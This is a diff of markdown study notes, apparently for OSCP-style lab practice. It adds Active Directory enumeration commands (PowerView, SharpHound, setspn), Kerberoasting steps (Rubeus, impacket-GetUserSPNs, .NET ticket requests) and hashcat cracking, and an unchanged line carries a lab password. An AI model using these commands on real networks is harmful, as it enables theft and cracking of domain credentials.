@@ -149,26 +149,36 @@ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Departmen
 enum4linux-ng -P 172.16.5.5 -oA ilfreight
 ```
 
-**net**
-```bash
-
-
-```
-
-## LAPS
-```bash
-
-
-```
-
 **command injection**
 ```bash
 runas.exe /netonly /user:<domain>\<username> cmd.exe
-
 ```
 
+**ActiveDirectory PowerShell Module**
+```bash
+# check if the module is imported
+Get-Module
 
+# import the module
+Import-Module ActiveDirectory
+Get-Module
 
+# get addomain
+Get-ADDomain
+
+# Get-ADUser
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+
+# trust
+Get-ADTrust -Filter *
+
+# group
+Get-ADGroup -Filter * | select name
+Get-ADGroup -Identity "Backup Operators"
+
+# group membership
+Get-ADGroupMember -Identity "Backup Operators"
+```
 
 
 **PowerView**
@@ -178,17 +188,32 @@ import-module .\PowerView.ps1
 Get-DomainPolicy
 
 # basic information about the domain
+Get-Domain
 Get-NetDomain
 
 # domain user objects
+Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
 Get-NetUser
 Get-NetUser | select cn
+
+# recursive group membership
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+
+# trust enumeration
+Get-DomainTrustMapping
 
 # domain group
 Get-NetGroup | select cn
 Get-NetGroup "Sales Department" | select member
 
+# Testing for Local Admin Access
+Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+
+# Finding Users With SPN Set
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+
 # domain computer
+Get-DomainComputer | select operatingsystem
 Get-NetComputer
 Get-NetComputer | select operatingsystem,dnshostname
 
@@ -216,6 +241,9 @@ Find-DomainShare
 
 **setspn**
 ```bash
+# enumerate spns
+setspn.exe -Q */*
+
 setspn -L iis_service
 ```
 
@@ -225,7 +253,10 @@ Import-Module .\Sharphound.ps1
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\TEMP\
 ```
 
-
+**Sharphound.exe**
+```bash
+.\SharpHound.exe -c All --zipfilename ILFREIGHT
+```
 
 # Lateral Movement
 
@@ -262,19 +293,49 @@ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast
 sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
-**Kerberoasting**
+## Kerberoasting
+### Manual way
+```bash
+#Enumerating SPNs with setspn.exe
+setspn.exe -Q */*
+
+# Targeting a Single User
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433" 
+
+#Retrieving All Tickets Using setspn.exe
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
+
+### Powerview
+```bash
+# enumerate spns
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+
+# target a specific user
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+
+```
+
+### Rubeus
+```bash
+# rebeus
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+```
+
+### impacket-GetUserSPNs
 ```bash
 # impacket-GetUserSPNs
 sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
-
-# rebeus
-.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 
 # crack hash
 sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
-**Silver ticket**
+## Silver ticket
 ![image](https://github.com/nuricheun/OSCP/assets/14031269/f699a792-5dbe-4804-bf52-977e0fee4888)
 ![image](https://github.com/nuricheun/OSCP/assets/14031269/fd16d1df-f248-4256-9b33-2230470bcea4)
 ```bash
